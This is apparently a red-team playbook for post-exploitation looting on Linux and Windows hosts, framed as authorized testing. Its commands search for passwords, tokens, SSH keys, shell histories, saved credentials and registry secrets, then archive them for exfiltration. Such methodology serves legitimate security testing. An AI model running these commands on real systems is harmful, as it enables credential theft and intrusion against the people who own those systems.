# Post-Foothold Looting Playbook (Linux + Windows)

This guide covers common, high-value looting actions after initial access on a target during authorized testing.

## Principles

- Prioritize fast, high-value artifacts first (credentials, keys, tokens, config files).
- Keep output organized per host and timestamp.
- Prefer native commands first; add tooling only when needed.
- Record source paths for every extracted artifact.

## Suggested Local Operator Setup

From your attacker machine inside a box workspace:

```bash
box <box_name>
mkdir -p loot/{linux,windows}/{raw,creds,configs,db,users,browser,proof}
```

---

## Linux Target Looting

## 1) Host and Identity Context

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
```

## 2) User and Access Enumeration

```bash
cat /etc/passwd
cat /etc/group
lastlog | head
w
who
sudo -l
```

## 3) Credential Material and Secrets

### Search likely secret locations/files

```bash
find /home -maxdepth 4 -type f \( -name "*.txt" -o -name "*.conf" -o -name "*.ini" -o -name "*.env" -o -name "*history*" \) 2>/dev/null
```

### Grep for sensitive strings

```bash
grep -RInE "pass(word)?|secret|token|api[_-]?key|aws_|AKIA|PRIVATE KEY|connection string" /home /var/www /opt 2>/dev/null
```

### Shell histories

```bash
cat ~/.bash_history 2>/dev/null
cat ~/.zsh_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
```

### SSH keys and known hosts

```bash
find /home /root -type f \( -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" -o -name "known_hosts" \) 2>/dev/null
```

## 4) Service and Application Config Loot

```bash
find /etc /opt /var/www -type f \( -name "*.conf" -o -name "*.cnf" -o -name "*.yaml" -o -name "*.yml" -o -name "*.json" \) 2>/dev/null
```

Target common config locations manually:

```bash
ls -la /var/www 2>/dev/null
ls -la /opt 2>/dev/null
ls -la /etc/nginx 2>/dev/null
ls -la /etc/apache2 2>/dev/null
```

## 5) Database Artifact Loot

```bash
find /var/lib -maxdepth 4 -type f \( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.mdb" \) 2>/dev/null
find / -type f -name "my.cnf" 2>/dev/null
```

## 6) Scheduled Jobs, Scripts, and Automation Secrets

```bash
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null
systemctl list-timers --all 2>/dev/null
```

## 7) Packaging Loot for Exfil

```bash
tar czf /tmp/linux_loot_$(hostname)_$(date +%F).tgz /home/*/.ssh /var/www /opt /etc 2>/dev/null
```

If using your local host helper:

```bash
# On attacker
host-payload loot

# On victim (push or pull depending on access model)
```

---

## Windows Target Looting

Use `cmd.exe` or PowerShell (prefer PowerShell when possible).

## 1) Host and Identity Context

### CMD

```cmd
whoami
hostname
systeminfo
whoami /priv
whoami /groups
```

### PowerShell

```powershell
$env:COMPUTERNAME
whoami
Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsHardwareAbstractionLayer
```

## 2) Users, Sessions, and Local Groups

```cmd
net user
net localgroup
net localgroup administrators
query user
```

## 3) Credential and Secret Discovery

### Unattend and deployment artifacts

```cmd
dir C:\unattend.xml /s /b
dir C:\Windows\Panther\Unattend.xml /s /b
dir C:\Windows\Panther\Unattend\Unattend.xml /s /b
```

### Search for common secret strings

```cmd
findstr /spin /c:"password" /c:"passwd" /c:"token" /c:"apikey" C:\Users\*\Desktop\* C:\Users\*\Documents\* C:\inetpub\wwwroot\* 2>nul
```

### PowerShell recursive content search

```powershell
Get-ChildItem -Path C:\Users,C:\inetpub,C:\xampp,C:\ProgramData -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.config,*.xml,*.ini,*.ps1,*.bat |
  Select-String -Pattern 'password|secret|token|api[_-]?key|connection string' -SimpleMatch -ErrorAction SilentlyContinue
```

## 4) Saved Credentials and Token Material

```cmd
cmdkey /list
```

PowerShell history and profiles:

```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
Get-ChildItem $PROFILE* -ErrorAction SilentlyContinue
```

## 5) Browser and User Data Targets

```cmd
dir "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default" /s /b
```

```cmd
dir "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles" /s /b
```

## 6) Registry Loot (Common Secrets/AutoLogon)

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
```

## 7) Shares, Mounts, and Network Loot Pivots

```cmd
net share
net use
arp -a
route print
ipconfig /all
```

## 8) Scheduled Tasks and Service Configs

```cmd
schtasks /query /fo LIST /v
wmic service get name,displayname,pathname,startmode
```

## 9) Database/App Config Discovery

```cmd
dir C:\inetpub\wwwroot /s /b
dir C:\xampp /s /b
dir C:\Program Files\* /s /b | findstr /i "config.ini web.config appsettings.json"
```

## 10) Archive Loot for Transfer

### PowerShell zip

```powershell
Compress-Archive -Path C:\Users\Public\Documents\*,C:\inetpub\wwwroot\* -DestinationPath C:\Windows\Temp\windows_loot.zip -Force
```

---

## High-Value Files to Prioritize

- Linux:
  - `/home/*/.ssh/*`
  - `/var/www/*` app configs
  - `.env` files
  - backup archives (`*.bak`, `*.old`, `*.zip`, `*.tar.gz`)
- Windows:
  - `web.config`, `appsettings.json`, `unattend.xml`
  - PowerShell history
  - saved credential artifacts (`cmdkey`, RDP/VPN profiles)
  - app/service configuration files under `ProgramData` and web roots

## Suggested Next Steps in Your Toolchain

1. Run `loot-parse` on collected output and archives.
2. Import recovered creds/hashes with `creds import-loot parsed`.
3. Re-run authenticated enumeration via `enum-ports` and `auto-recon`.
4. Use `deploy-privesc` if privilege escalation checks are still needed.
